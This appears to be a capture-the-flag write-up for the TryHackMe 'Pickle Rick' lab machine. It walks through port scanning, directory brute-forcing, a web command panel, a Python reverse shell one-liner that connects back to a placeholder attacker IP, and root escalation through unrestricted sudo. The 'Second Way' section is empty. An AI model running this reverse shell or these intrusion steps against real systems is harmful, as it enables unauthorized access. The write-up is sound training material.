# TryHackMe-Pickle-Rick
This is a writeup for Pickle Rick TryHackMe machine!  
https://tryhackme.com/room/picklerick

## Scanning & Enumeration

To begin with this machine, we will perform a nmap scan on our target:

```
nmap -sV -sC -T5 10.10.122.153
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 01:01 EDT
Nmap scan report for 10.10.122.153
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 79:d6:1c:ca:5e:5c:3f:14:83:d4:21:07:b1:01:76:c1 (RSA)
|   256 61:2e:22:78:78:b9:d7:7e:c9:77:2d:d3:29:07:07:da (ECDSA)
|_  256 07:64:71:80:17:56:a6:79:61:bd:d4:09:f3:85:15:4d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Service Enumeration
### Port 22 - SSH
### Port 80 - HTTP

Now we'll proceed to visit the website located at port 80
![image_2024-04-26_001448881](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/028603ac-1f72-4fd7-8b5a-83b00aa96054)
This is the first thing we see on the website, if we take a view on the page source we can find this
![image_2024-04-26_001731557](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/01135460-5b08-40c8-bfb3-cae0ffbea415)
Looks like we found an username, next, we will proceed to find hidden directories that may have been hidden from us
## Directory Fuzzing
## Using Gobuster
**Gobuster** is a tool used to brute-force:
* URIs (directories and files) in web sites.
* DNS subdomains (with wildcard support).
* Virtual Host names on target web servers.
* Open Amazon S3 buckets.
* Open Google Cloud buckets.
* TFTP servers
#### If you wish to install Gobuster, here is the link to the official github repository: https://github.com/OJ/gobuster
```
gobuster dir -u 'http://10.10.122.153/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 --no-error -x php,sh,txt,cgi,html,css,js,py
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.122.153/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,sh,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]
/.php                 (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 1062]
/assets               (Status: 301) [Size: 315] [--> http://10.10.122.153/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
```
This are some directory gobuster could find for us, we could be interested in **/login.php** so we will navigate into it
![image_2024-04-26_003529817](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/bbb9309b-3f13-431f-9c04-31f441a966f2)
We will find a login page, we already have the username but we lack the password, so we can keep with the directory fuzzing
At some point, we will encounter a file called **robots.txt**, most websites will have a robots.txt file which basically tells the sitee what it is allowed and not allowed to index.
If we check the robots.txt file we will encounter
![image_2024-04-26_003953275](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/f874ffe2-2943-4d26-991e-d1a19f75a39b)
This could be the password for our **/login.php** so lets try
![image_2024-04-26_004100740](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/a0f5cb3e-e8eb-40fd-949e-1416b55078db)
And we were right, it was indeed the password for our **/login.php**
## Command Panel
The site we were redirected has a command panel, so, lets try to execute some simple command to see if it allows us to do so
![image_2024-04-26_004451144](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/9fb45fdf-e904-4727-a731-71c03ef058e0)
And with this, we realize we can actually execute commands, if we try to execute a **cat** in Sup3rS3cretPickl3Ingred.txt, we are disallowed to perform it
![image_2024-04-26_004650641](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/488fe1f4-f619-46bc-a066-36a7ea11114c)
We can read the file if we do this though
```
http://<ip>/Sup3rS3cretPickl3Ingred.txt
```
And like that, we will have the first ingredient

At this point, we could go for two ways on exploiting this machine to get the other ingredientes

## First way
### Getting a reverse shell through command panel
First, we can search the python version with 
```
which python3
which python2
which python
```
We will find this
![image_2024-04-26_005506068](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/00f2e85c-1ce6-4aa0-bb96-c120d5d09188)
Ok, so now we know that python3 is on this machine so lets get a reverse shell using this:
`python3 -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<yourIp>",<listeningPort>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
Before we execute the command we need a netcat set on the port we specified like this

![image_2024-04-26_005931396](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/28f227fb-d676-4c0b-9a7e-5797d115a2bb)

If everything is working right, we will receive a reverse shell on our listening port

![image_2024-04-26_010239772](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/959d6e72-01b1-4c63-a953-ccd4d6226ed5)

We can upgrade this shell using `bash -i`
So, with this shell, we are way more comfortable moving around the machine without needing to use the command panel
Lets search for the other ingredients

![image_2024-04-26_010637175](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/059b7936-ce3a-410b-9197-0cf37deebe78)

If we move to this directory and do a `ls` on it, we will find the second ingredient

![image](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/6fab408b-ff97-424a-ae4e-5d36c30ea34b)

Or we can just ls the directory to see what is inside of it

![image](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/a33781a9-c3d7-45c6-9c04-862b6a78352d)

We will find the third ingredient on **/root** but if we try to `cd` on it, we will find we are unable to do it, so lets check for our privileges with `sudo -l`

![image](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/70d7d8f8-d240-4304-9b52-8d068f9c4dcc)

To our surprise, all commands are allowed without any password needed so lets just do a `sudo bash -i` to escalate our session into a root one

![image](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/819bc036-1b5d-4891-8c6c-e4ad6652600c)

And just like that we are user root and now we can read the third ingredient within the /root directory

![image](https://github.com/smoothonghub/TryHackMe-Pickle-Rick/assets/86502006/a3d4301f-0bae-4b87-a2f4-92da370c1481)

## Second Way



